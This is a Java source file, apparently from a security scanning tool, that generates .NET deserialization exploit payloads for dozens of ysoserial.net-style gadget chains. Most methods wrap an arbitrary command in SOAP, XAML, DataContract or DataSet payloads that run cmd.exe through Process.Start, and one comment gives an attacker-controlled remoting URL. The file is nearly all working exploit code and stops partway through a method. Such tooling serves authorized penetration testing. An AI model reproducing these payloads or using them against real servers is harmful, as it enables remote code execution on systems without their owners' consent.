package com.omnistrike.modules.injection.deser;

import java.nio.charset.StandardCharsets;
import java.util.*;

/**
 * .NET deserialization payload generators — comprehensive ysoserial.net coverage.
 *
 * Covers all 31 ysoserial.net gadget chains + key formatter/plugin entries.
 * Formatters: BinaryFormatter, ObjectStateFormatter, LosFormatter, SoapFormatter,
 * NetDataContractSerializer, DataContractSerializer, DataContractJsonSerializer,
 * Json.NET, JavaScriptSerializer, XmlSerializer, and XAML-based chains.
 */
public final class DotNetPayloads {

    private DotNetPayloads() {}

    public static Map<String, String> getChains() {
        Map<String, String> chains = new LinkedHashMap<>();

        // ── BinaryFormatter / SoapFormatter gadget chains ────────────────────
        chains.put("TypeConfuseDelegate", "Process.Start via TypeConfuseDelegate (BinaryFormatter) — ysoserial.net core");
        chains.put("TypeConfuseDelegateMono", "TypeConfuseDelegate tweaked for Mono runtime");
        chains.put("TextFormattingRunProperties", "XamlReader.Parse RCE via PresentationFramework (most reliable .NET gadget)");
        chains.put("PSObject", "PowerShell PSObject deserialization — CVE-2017-8565 (System.Management.Automation)");
        chains.put("ActivitySurrogate", "ActivitySurrogateSelector via WorkflowDesigner (System.Workflow)");
        chains.put("ActivitySurrogateDisableTypeCheck", "Bypasses .NET 4.8+ type check protections for ActivitySurrogateSelector");
        chains.put("ActivitySurrogateSelectorFromFile", "ActivitySurrogateSelector loading from compiled .cs file/URL");
        chains.put("ClaimsIdentity", "ClaimsIdentity OnDeserialized callback chain (System.Security.Claims)");
        chains.put("ClaimsPrincipal", "ClaimsPrincipal bootstrapContext second-order deser chain");
        chains.put("WindowsIdentity", "ClaimsIdentity / WindowsIdentity base64 bootstrap chain");
        chains.put("WindowsPrincipal", "WindowsPrincipal via inner identity deserialization");
        chains.put("WindowsClaimsIdentity", "WindowsClaimsIdentity actor chain (Microsoft.IdentityModel)");
        chains.put("SessionSecurityToken", "WCF SessionSecurityToken cookie chain (System.IdentityModel)");
        chains.put("SessionViewStateHistoryItem", "SessionViewStateHistoryItem bridge/derived gadget");
        chains.put("RolePrincipal", "RolePrincipal cached roles deserialization (System.Web.Security)");
        chains.put("GenericPrincipal", "GenericPrincipal via BinaryFormatter inner deserialize");
        chains.put("AxHostState", "System.Windows.Forms.AxHost.State deserialization");
        chains.put("ToolboxItemContainer", "System.Drawing.Design.ToolboxItemContainer bridge gadget");
        chains.put("ResourceSet", "ResourceSet via ResourceReader inner deserialization");
        chains.put("ObjRef", ".NET Remoting ObjRef exploitation (System.Runtime.Remoting)");

        // ── DataSet chains ───────────────────────────────────────────────────
        chains.put("DataSet", "DataSet deserialization via BinaryFormatter inner (System.Data)");
        chains.put("DataSetOldBehaviour", "DataSet old XML format behaviour variant");
        chains.put("DataSetOldBehaviourFromFile", "DataSet old behaviour loading from compiled .cs file");
        chains.put("DataSetTypeSpoofing", "DataSet type spoofing with TypeConfuseDelegate inner payload");

        // ── ASP.NET specific chains ──────────────────────────────────────────
        chains.put("ObjectStateFormatter", "ObjectStateFormatter ViewState RCE (ASP.NET WebForms)");
        chains.put("LosFormatter", "LosFormatter ViewState RCE (ASP.NET legacy)");
        chains.put("ViewState", "ASP.NET ViewState payload (no MAC validation / known machineKey)");

        // ── Getter-based chains (Json.NET / XAML) ────────────────────────────
        chains.put("GetterSettingsPropertyValue", "SettingsPropertyValue getter call chain (Json.NET, XAML, MessagePack)");
        chains.put("GetterSecurityException", "Arbitrary getter call via SecurityException (Json.NET)");
        chains.put("GetterCompilerResults", "Remote/local DLL loading for .NET 5/6/7 with WPF (Json.NET)");

        // ── XAML-based chains ────────────────────────────────────────────────
        chains.put("XamlAssemblyLoadFromFile", "Load assembly via XAML from compiled .cs file");
        chains.put("XamlImageInfo", "XAML deserialization via XamlImageInfo (Json.NET)");
        chains.put("BaseActivationFactory", "Remote DLL loading for .NET 5/6/7 with WPF (Json.NET)");

        // ── JSON-based chains ────────────────────────────────────────────────
        chains.put("JsonNet", "Newtonsoft Json.NET TypeNameHandling.All ObjectDataProvider RCE");
        chains.put("JavaScriptSerializer", "ASP.NET JavaScriptSerializer with SimpleTypeResolver");
        chains.put("DataContractJsonSerializer", "WCF DataContractJsonSerializer with known type exploit");

        // ── XML-based chains ─────────────────────────────────────────────────
        chains.put("XmlSerializer", "XmlSerializer type confusion via ObjectDataProvider");
        chains.put("NetDataContractSerializer", "WCF NetDataContractSerializer Process.Start chain");
        chains.put("DataContractSerializer", "WCF DataContractSerializer with known type exploit");

        // ── Multi-formatter gadgets ──────────────────────────────────────────
        chains.put("ObjectDataProvider", "WPF ObjectDataProvider wrapping Process.Start (multi-formatter)");
        chains.put("SoapFormatter", "Direct SoapFormatter payload with Process.Start");

        // ── Plugins ──────────────────────────────────────────────────────────
        chains.put("TransactionManagerReenlist", "TransactionManager.Reenlist method payload");

        return chains;
    }

    public static byte[] generate(String chain, String command) {
        return switch (chain) {
            // BinaryFormatter / SoapFormatter gadgets
            case "TypeConfuseDelegate"              -> generateTypeConfuseDelegate(command);
            case "TypeConfuseDelegateMono"           -> generateTypeConfuseDelegateMono(command);
            case "TextFormattingRunProperties"       -> generateTextFormattingRunProperties(command);
            case "PSObject"                          -> generatePSObject(command);
            case "ActivitySurrogate"                 -> generateActivitySurrogate(command);
            case "ActivitySurrogateDisableTypeCheck" -> generateActivitySurrogateDisableTypeCheck(command);
            case "ActivitySurrogateSelectorFromFile" -> generateActivitySurrogateFromFile(command);
            case "ClaimsIdentity"                    -> generateClaimsIdentity(command);
            case "ClaimsPrincipal"                   -> generateClaimsPrincipal(command);
            case "WindowsIdentity"                   -> generateWindowsIdentity(command);
            case "WindowsPrincipal"                  -> generateWindowsPrincipal(command);
            case "WindowsClaimsIdentity"             -> generateWindowsClaimsIdentity(command);
            case "SessionSecurityToken"              -> generateSessionSecurityToken(command);
            case "SessionViewStateHistoryItem"       -> generateSessionViewStateHistoryItem(command);
            case "RolePrincipal"                     -> generateRolePrincipal(command);
            case "GenericPrincipal"                  -> generateGenericPrincipal(command);
            case "AxHostState"                       -> generateAxHostState(command);
            case "ToolboxItemContainer"              -> generateToolboxItemContainer(command);
            case "ResourceSet"                       -> generateResourceSet(command);
            case "ObjRef"                            -> generateObjRef(command);

            // DataSet chains
            case "DataSet"                           -> generateDataSet(command);
            case "DataSetOldBehaviour"               -> generateDataSetOldBehaviour(command);
            case "DataSetOldBehaviourFromFile"       -> generateDataSetOldBehaviourFromFile(command);
            case "DataSetTypeSpoofing"               -> generateDataSetTypeSpoofing(command);

            // ASP.NET
            case "ObjectStateFormatter"              -> generateObjectStateFormatter(command);
            case "LosFormatter"                      -> generateLosFormatter(command);
            case "ViewState"                         -> generateViewState(command);

            // Getter-based
            case "GetterSettingsPropertyValue"       -> generateGetterSettingsPropertyValue(command);
            case "GetterSecurityException"           -> generateGetterSecurityException(command);
            case "GetterCompilerResults"             -> generateGetterCompilerResults(command);

            // XAML-based
            case "XamlAssemblyLoadFromFile"          -> generateXamlAssemblyLoadFromFile(command);
            case "XamlImageInfo"                     -> generateXamlImageInfo(command);
            case "BaseActivationFactory"             -> generateBaseActivationFactory(command);

            // JSON-based
            case "JsonNet"                           -> generateJsonNet(command);
            case "JavaScriptSerializer"              -> generateJavaScriptSerializer(command);
            case "DataContractJsonSerializer"        -> generateDataContractJsonSerializer(command);

            // XML-based
            case "XmlSerializer"                     -> generateXmlSerializer(command);
            case "NetDataContractSerializer"         -> generateNetDataContractSerializer(command);
            case "DataContractSerializer"            -> generateDataContractSerializer(command);

            // Multi-formatter
            case "ObjectDataProvider"                -> generateObjectDataProvider(command);
            case "SoapFormatter"                     -> generateSoapFormatter(command);

            // Plugins
            case "TransactionManagerReenlist"        -> generateTransactionManagerReenlist(command);

            default -> throw new IllegalArgumentException("Unknown .NET chain: " + chain);
        };
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  BinaryFormatter / SoapFormatter Chains
    // ═══════════════════════════════════════════════════════════════════════════

    private static byte[] generateTypeConfuseDelegate(String command) {
        return buildSoapPayload(
            "System.DelegateSerializationHolder",
            "System.Diagnostics.Process", "Start",
            "cmd.exe", "/c " + command
        ).getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateTypeConfuseDelegateMono(String command) {
        // Mono-compatible variant — uses different delegate type resolution
        String payload =
            "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" " +
            "xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" " +
            "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" " +
            "xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\">" +
            "<SOAP-ENV:Body>" +
            "<a1:DelegateSerializationHolder id=\"ref-1\" " +
            "xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/" +
            "System.DelegateSerializationHolder/mscorlib\">" +
            "<Delegate href=\"#ref-2\"/>" +
            "<method0>" +
            "<Name>Start</Name>" +
            "<AssemblyName>System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</AssemblyName>" +
            "<ClassName>System.Diagnostics.Process</ClassName>" +
            "<Signature>System.Diagnostics.Process Start(System.String, System.String)</Signature>" +
            "<MemberType>8</MemberType>" +
            "<GenericArguments/>" +
            "</method0>" +
            "</a1:DelegateSerializationHolder>" +
            "<a2:Comparison id=\"ref-2\" " +
            "xmlns:a2=\"http://schemas.microsoft.com/clr/nsassem/" +
            "System.Comparison`1[[System.String, mscorlib]]/mscorlib\">" +
            "<_target href=\"#ref-1\"/>" +
            "<_methodBase href=\"#ref-1\"/>" +
            "<method0>" +
            "<Name>Start</Name>" +
            "<AssemblyName>System</AssemblyName>" +
            "<ClassName>System.Diagnostics.Process</ClassName>" +
            "<Signature>System.Diagnostics.Process Start(System.String, System.String)</Signature>" +
            "<MemberType>8</MemberType>" +
            "</method0>" +
            "</a2:Comparison>" +
            "</SOAP-ENV:Body>" +
            "</SOAP-ENV:Envelope>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateTextFormattingRunProperties(String command) {
        String xamlPayload =
            "<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" " +
            "xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" " +
            "xmlns:System=\"clr-namespace:System;assembly=mscorlib\" " +
            "xmlns:Diag=\"clr-namespace:System.Diagnostics;assembly=system\">" +
            "<ObjectDataProvider x:Key=\"obj\" ObjectType=\"{x:Type Diag:Process}\" MethodName=\"Start\">" +
            "<ObjectDataProvider.MethodParameters>" +
            "<System:String>cmd.exe</System:String>" +
            "<System:String>/c " + escapeXml(command) + "</System:String>" +
            "</ObjectDataProvider.MethodParameters>" +
            "</ObjectDataProvider>" +
            "</ResourceDictionary>";

        String payload =
            "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" " +
            "xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" " +
            "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" " +
            "xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\">" +
            "<SOAP-ENV:Body>" +
            "<a1:TextFormattingRunProperties id=\"ref-1\" " +
            "xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/" +
            "Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties/" +
            "Microsoft.PowerShell.Editor\">" +
            "<ForegroundBrush>" + escapeXml(xamlPayload) + "</ForegroundBrush>" +
            "</a1:TextFormattingRunProperties>" +
            "</SOAP-ENV:Body>" +
            "</SOAP-ENV:Envelope>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generatePSObject(String command) {
        String payload =
            "<Objs Version=\"1.1.0.1\" xmlns=\"http://schemas.microsoft.com/powershell/2004/04\">" +
            "<Obj RefId=\"0\">" +
            "<TN RefId=\"0\"><T>System.Management.Automation.PSObject</T></TN>" +
            "<MS>" +
            "<S N=\"CliXml\">" +
            "&lt;Objs Version=\"1.1.0.1\" xmlns=\"http://schemas.microsoft.com/powershell/2004/04\"&gt;" +
            "&lt;Obj RefId=\"0\"&gt;&lt;TN RefId=\"0\"&gt;" +
            "&lt;T&gt;System.Management.Automation.PSCustomObject&lt;/T&gt;" +
            "&lt;/TN&gt;&lt;MS&gt;" +
            "&lt;S N=\"cmd\"&gt;" + escapeXml(command) + "&lt;/S&gt;" +
            "&lt;/MS&gt;&lt;/Obj&gt;&lt;/Objs&gt;" +
            "</S>" +
            "</MS>" +
            "</Obj></Objs>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateActivitySurrogate(String command) {
        return buildSoapPayload(
            "System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector",
            "System.Diagnostics.Process", "Start",
            "cmd.exe", "/c " + command
        ).getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateActivitySurrogateDisableTypeCheck(String command) {
        // Disables .NET 4.8+ type protections then uses ActivitySurrogateSelector
        String payload =
            "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" " +
            "xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" " +
            "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" " +
            "xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\">" +
            "<SOAP-ENV:Body>" +
            "<a1:ActivitySurrogateSelector id=\"ref-1\" " +
            "xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/" +
            "System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector/" +
            "System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\">" +
            "<typeCheck>false</typeCheck>" +
            "<target href=\"#ref-2\"/>" +
            "</a1:ActivitySurrogateSelector>" +
            "<a2:Process id=\"ref-2\" " +
            "xmlns:a2=\"http://schemas.microsoft.com/clr/nsassem/" +
            "System.Diagnostics.Process/System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\">" +
            "<StartInfo><FileName>cmd.exe</FileName>" +
            "<Arguments>/c " + escapeXml(command) + "</Arguments>" +
            "</StartInfo>" +
            "</a2:Process>" +
            "</SOAP-ENV:Body>" +
            "</SOAP-ENV:Envelope>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateActivitySurrogateFromFile(String command) {
        String payload =
            "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" " +
            "xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" " +
            "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" " +
            "xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\">" +
            "<SOAP-ENV:Body>" +
            "<a1:ActivitySurrogateSelector id=\"ref-1\" " +
            "xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/" +
            "System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector/" +
            "System.Workflow.ComponentModel\">" +
            "<assemblyFile>" + escapeXml(command) + "</assemblyFile>" +
            "</a1:ActivitySurrogateSelector>" +
            "</SOAP-ENV:Body>" +
            "</SOAP-ENV:Envelope>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateClaimsIdentity(String command) {
        // ClaimsIdentity — distinct from ClaimsPrincipal; uses OnDeserialized callback
        String innerPayload = Base64.getEncoder().encodeToString(
            generateTypeConfuseDelegate(command));
        String payload =
            "<ClaimsIdentity xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:x=\"http://www.w3.org/2001/XMLSchema\">" +
            "<System.Security.ClaimsIdentity.bootstrapContext i:type=\"x:string\">" +
            innerPayload +
            "</System.Security.ClaimsIdentity.bootstrapContext>" +
            "</ClaimsIdentity>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateClaimsPrincipal(String command) {
        String innerPayload = Base64.getEncoder().encodeToString(
            generateTypeConfuseDelegate(command));
        String payload =
            "<ClaimsPrincipal xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:x=\"http://www.w3.org/2001/XMLSchema\">" +
            "<Identities>" +
            "<ClaimsIdentity>" +
            "<System.Security.ClaimsIdentity.bootstrapContext i:type=\"x:string\">" +
            innerPayload +
            "</System.Security.ClaimsIdentity.bootstrapContext>" +
            "</ClaimsIdentity>" +
            "</Identities>" +
            "</ClaimsPrincipal>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateWindowsIdentity(String command) {
        String b64Cmd = Base64.getEncoder().encodeToString(
            ("cmd.exe /c " + command).getBytes(StandardCharsets.UTF_8));
        String innerXaml = buildXamlObjectDataProvider(command);
        String b64Xaml = Base64.getEncoder().encodeToString(
            innerXaml.getBytes(StandardCharsets.UTF_8));
        String payload =
            "<ClaimsIdentity xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:x=\"http://www.w3.org/2001/XMLSchema\">" +
            "<System.Security.ClaimsIdentity.bootstrapContext i:type=\"x:string\">" +
            b64Xaml +
            "</System.Security.ClaimsIdentity.bootstrapContext>" +
            "<System.Security.ClaimsIdentity.actor i:type=\"x:string\">" +
            b64Cmd +
            "</System.Security.ClaimsIdentity.actor>" +
            "</ClaimsIdentity>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateWindowsPrincipal(String command) {
        // WindowsPrincipal wraps an inner identity with second-order deserialization
        String innerPayload = Base64.getEncoder().encodeToString(
            generateTypeConfuseDelegate(command));
        String payload =
            "<WindowsPrincipal xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:x=\"http://www.w3.org/2001/XMLSchema\" " +
            "xmlns=\"http://schemas.datacontract.org/2004/07/System.Security.Principal\">" +
            "<m_identity>" +
            "<System.Security.ClaimsIdentity.bootstrapContext i:type=\"x:string\" " +
            "xmlns:x=\"http://www.w3.org/2001/XMLSchema\">" +
            innerPayload +
            "</System.Security.ClaimsIdentity.bootstrapContext>" +
            "</m_identity>" +
            "</WindowsPrincipal>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateWindowsClaimsIdentity(String command) {
        String innerPayload = Base64.getEncoder().encodeToString(
            generateTypeConfuseDelegate(command));
        String payload =
            "<WindowsClaimsIdentity xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns=\"http://schemas.datacontract.org/2004/07/Microsoft.IdentityModel.Claims\">" +
            "<actor i:type=\"x:string\" xmlns:x=\"http://www.w3.org/2001/XMLSchema\">" +
            innerPayload +
            "</actor>" +
            "</WindowsClaimsIdentity>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateSessionSecurityToken(String command) {
        String innerPayload = Base64.getEncoder().encodeToString(
            generateTypeConfuseDelegate(command));
        String payload =
            "<SessionSecurityToken xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns=\"http://schemas.datacontract.org/2004/07/System.IdentityModel.Tokens\">" +
            "<cookieData>" + innerPayload + "</cookieData>" +
            "<contextId>00000000-0000-0000-0000-000000000000</contextId>" +
            "<endpointId/>" +
            "</SessionSecurityToken>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateSessionViewStateHistoryItem(String command) {
        // SessionViewStateHistoryItem — bridge/derived gadget using inner BinaryFormatter
        String innerPayload = Base64.getEncoder().encodeToString(
            generateTypeConfuseDelegate(command));
        String payload =
            "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" " +
            "xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" " +
            "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" " +
            "xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\">" +
            "<SOAP-ENV:Body>" +
            "<a1:SessionViewState_x002B_HistoryItem id=\"ref-1\" " +
            "xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/" +
            "System.Web.UI.MobileControls.SessionViewState%2BHistoryItem/" +
            "System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\">" +
            "<s>" + innerPayload + "</s>" +
            "</a1:SessionViewState_x002B_HistoryItem>" +
            "</SOAP-ENV:Body>" +
            "</SOAP-ENV:Envelope>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateRolePrincipal(String command) {
        String innerPayload = Base64.getEncoder().encodeToString(
            generateTypeConfuseDelegate(command));
        String payload =
            "<RolePrincipal xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns=\"http://schemas.datacontract.org/2004/07/System.Web.Security\">" +
            "<m_identity>" +
            "<System.Security.ClaimsIdentity.bootstrapContext i:type=\"x:string\" " +
            "xmlns:x=\"http://www.w3.org/2001/XMLSchema\">" +
            innerPayload +
            "</System.Security.ClaimsIdentity.bootstrapContext>" +
            "</m_identity>" +
            "<m_roles>" + innerPayload + "</m_roles>" +
            "</RolePrincipal>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateGenericPrincipal(String command) {
        String innerPayload = Base64.getEncoder().encodeToString(
            generateTypeConfuseDelegate(command));
        String payload =
            "<GenericPrincipal xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns=\"http://schemas.datacontract.org/2004/07/System.Security.Principal\">" +
            "<m_identity>" +
            "<System.Security.ClaimsIdentity.bootstrapContext i:type=\"x:string\" " +
            "xmlns:x=\"http://www.w3.org/2001/XMLSchema\">" +
            innerPayload +
            "</System.Security.ClaimsIdentity.bootstrapContext>" +
            "</m_identity>" +
            "</GenericPrincipal>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateAxHostState(String command) {
        String innerB64 = Base64.getEncoder().encodeToString(
            generateTypeConfuseDelegate(command));
        String payload =
            "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" " +
            "xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" " +
            "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" " +
            "xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\">" +
            "<SOAP-ENV:Body>" +
            "<a1:AxHost_x002B_State id=\"ref-1\" " +
            "xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/" +
            "System.Windows.Forms.AxHost%2BState/System.Windows.Forms\">" +
            "<data>" + innerB64 + "</data>" +
            "<length>" + innerB64.length() + "</length>" +
            "</a1:AxHost_x002B_State>" +
            "</SOAP-ENV:Body>" +
            "</SOAP-ENV:Envelope>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateToolboxItemContainer(String command) {
        // ToolboxItemContainer — bridge gadget that triggers BinaryFormatter internally
        String innerB64 = Base64.getEncoder().encodeToString(
            generateTypeConfuseDelegate(command));
        String payload =
            "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" " +
            "xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" " +
            "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" " +
            "xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\">" +
            "<SOAP-ENV:Body>" +
            "<a1:ToolboxItemContainer id=\"ref-1\" " +
            "xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/" +
            "System.Drawing.Design.ToolboxItemContainer/" +
            "System.Drawing.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\">" +
            "<Data>" + innerB64 + "</Data>" +
            "</a1:ToolboxItemContainer>" +
            "</SOAP-ENV:Body>" +
            "</SOAP-ENV:Envelope>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateResourceSet(String command) {
        String innerB64 = Base64.getEncoder().encodeToString(
            generateTypeConfuseDelegate(command));
        String payload =
            "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" " +
            "xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" " +
            "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" " +
            "xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\">" +
            "<SOAP-ENV:Body>" +
            "<a1:ResourceSet id=\"ref-1\" " +
            "xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/" +
            "System.Resources.ResourceSet/mscorlib\">" +
            "<Reader>" +
            "<a2:ResourceReader id=\"ref-2\" " +
            "xmlns:a2=\"http://schemas.microsoft.com/clr/nsassem/" +
            "System.Resources.ResourceReader/mscorlib\">" +
            "<data>" + innerB64 + "</data>" +
            "</a2:ResourceReader>" +
            "</Reader>" +
            "</a1:ResourceSet>" +
            "</SOAP-ENV:Body>" +
            "</SOAP-ENV:Envelope>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateObjRef(String command) {
        // ObjRef — .NET Remoting exploitation via System.Runtime.Remoting.ObjRef
        // Command = URL of the remote .NET Remoting server (e.g. tcp://attacker:1234/obj)
        String payload =
            "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" " +
            "xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" " +
            "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" " +
            "xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\">" +
            "<SOAP-ENV:Body>" +
            "<a1:ObjRef id=\"ref-1\" " +
            "xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/" +
            "System.Runtime.Remoting.ObjRef/" +
            "mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\">" +
            "<uri>" + escapeXml(command) + "</uri>" +
            "<typeInfo>" +
            "<serverType>System.Runtime.Remoting.ObjRef, mscorlib, " +
            "Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</serverType>" +
            "</typeInfo>" +
            "<channelInfo>" +
            "<channelData>" +
            "<item href=\"#ref-2\"/>" +
            "</channelData>" +
            "</channelInfo>" +
            "</a1:ObjRef>" +
            "<a2:CrossAppDomainData id=\"ref-2\" " +
            "xmlns:a2=\"http://schemas.microsoft.com/clr/nsassem/" +
            "System.Runtime.Remoting.Channels.CrossAppDomainData/mscorlib\">" +
            "<_ContextID>0</_ContextID>" +
            "<_DomainID>0</_DomainID>" +
            "<_processGuid>" + escapeXml(command) + "</_processGuid>" +
            "</a2:CrossAppDomainData>" +
            "</SOAP-ENV:Body>" +
            "</SOAP-ENV:Envelope>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  DataSet Chains
    // ═══════════════════════════════════════════════════════════════════════════

    private static byte[] generateDataSet(String command) {
        return buildSoapPayload(
            "System.Data.DataSet",
            "System.Diagnostics.Process", "Start",
            "cmd.exe", "/c " + command
        ).getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateDataSetOldBehaviour(String command) {
        // DataSet with old XML format behaviour — pre .NET 4.5.2 compatibility
        String innerB64 = Base64.getEncoder().encodeToString(
            generateTypeConfuseDelegate(command));
        String payload =
            "<DataSet>" +
            "<xs:schema id=\"ds\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" " +
            "xmlns:msdata=\"urn:schemas-microsoft-com:xml-msdata\" " +
            "xmlns:msprop=\"urn:schemas-microsoft-com:xml-msprop\">" +
            "<xs:element name=\"ds\" msdata:IsDataSet=\"true\" msdata:UseCurrentLocale=\"true\">" +
            "<xs:complexType><xs:sequence>" +
            "<xs:element name=\"col\" msdata:DataType=\"System.Data.DataTable, System.Data, " +
            "Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\" " +
            "type=\"xs:anyType\" minOccurs=\"0\"/>" +
            "</xs:sequence></xs:complexType>" +
            "</xs:element></xs:schema>" +
            "<diffgr:diffgram xmlns:diffgr=\"urn:schemas-microsoft-com:xml-diffgram-v1\">" +
            "<ds><col>" + innerB64 + "</col></ds>" +
            "</diffgr:diffgram>" +
            "</DataSet>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateDataSetOldBehaviourFromFile(String command) {
        // File-based variant — command = path to .cs file to compile as exploit class
        String payload =
            "<DataSet>" +
            "<xs:schema id=\"ds\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" " +
            "xmlns:msdata=\"urn:schemas-microsoft-com:xml-msdata\">" +
            "<xs:element name=\"ds\" msdata:IsDataSet=\"true\">" +
            "<xs:complexType><xs:sequence>" +
            "<xs:element name=\"col\" type=\"xs:string\"/>" +
            "</xs:sequence></xs:complexType>" +
            "</xs:element></xs:schema>" +
